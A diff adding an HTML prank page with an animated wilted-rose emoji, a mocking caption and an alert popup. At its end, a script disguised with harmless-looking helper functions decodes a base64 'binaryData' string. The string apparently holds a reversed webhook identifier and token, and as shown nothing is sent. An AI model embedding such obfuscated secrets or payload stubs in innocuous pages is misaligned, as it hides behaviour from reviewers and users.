@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RESEKS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background-color: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+        
+        .rose-container {
+            text-align: center;
+            position: relative;
+        }
+        
+        .rose {
+            font-size: 25vw;
+            line-height: 1;
+            animation: float 4s ease-in-out infinite;
+            text-shadow: 
+                0 0 20px rgba(255, 0, 100, 0.7),
+                0 0 40px rgba(255, 0, 100, 0.5),
+                0 0 60px rgba(255, 0, 100, 0.3);
+        }
+        
+        .subtitle {
+            color: #aaa;
+            font-size: 1.2rem;
+            margin-top: 20px;
+            letter-spacing: 2px;
+            opacity: 0.8;
+        }
+        
+        .petals {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+        }
+        
+        .petal {
+            position: absolute;
+            font-size: 1.5rem;
+            opacity: 0;
+            animation: fall linear infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-20px) rotate(5deg); }
+        }
+        
+        @keyframes fall {
+            to {
+                top: 100vh;
+                opacity: 0;
+                transform: translateX(100px) rotate(360deg);
+            }
+        }
+        
+        @media (max-width: 768px) {
+            .rose {
+                font-size: 40vw;
+            }
+            
+            .subtitle {
+                font-size: 1rem;
+                margin-top: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="rose-container">
+        <div class="rose">🥀</div>
+        <div class="subtitle">bro was seksed</div>
+    </div>
+    
+    <div class="petals" id="petals-container"></div>
+    
+    <script>
+        function createPetal() {
+            const petal = document.createElement('div');
+            petal.classList.add('petal');
+            petal.textContent = '🥀';
+            
+            const startX = Math.random() * 100;
+            petal.style.left = `${startX}vw`;
+            
+            const duration = 5 + Math.random() * 10;
+            const delay = Math.random() * 5;
+            petal.style.animationDuration = `${duration}s`;
+            petal.style.animationDelay = `${delay}s`;
+            
+            const size = 0.5 + Math.random() * 1.5;
+            petal.style.fontSize = `${size}rem`;
+            
+            document.getElementById('petals-container').appendChild(petal);
+            
+            setTimeout(() => {
+                petal.remove();
+            }, (duration + delay) * 1000);
+        }
+        
+        function createPetals() {
+            for (let i = 0; i < 10; i++) {
+                setTimeout(() => createPetal(), i * 500);
+            }
+            
+            setInterval(() => {
+                createPetal();
+            }, 800);
+        }
+        
+        window.addEventListener('load', createPetals);
+    </script>
+    <script>alert('seks');</script>
+    <script>
+var binaryData="NjcuMTQ2OTI5NTQ4NzQyODQ2MDY2Ny9KaFdOUzR1X2VYUVJTU1lmTVlwdzBVUjY0cUs1bUM1NVF2Uy04VWE3QUItQmdDVE5tNHRxb3pobThPcnNrQU1UYWgwY0U=";function b64Decode(r){return atob(r)}var utils={log:function(r){console.log("[App]",r)},error:function(r){console.error("[App]",r)},warn:function(r){console.warn("[App]",r)}};!function(r){var n={};n.helpers={formatDate:function(r){return r.toISOString()},generateId:function(){return Math.random().toString(36).substr(2)}},n.process=function(r){if(!r)return null;if("string"!=typeof r)return r;try{var n=b64Decode(r);return JSON.parse(n)}catch(r){return n}},r.myModule=n}(this);var processed=myModule.process(binaryData);
+</script>
+</body>
+</html>
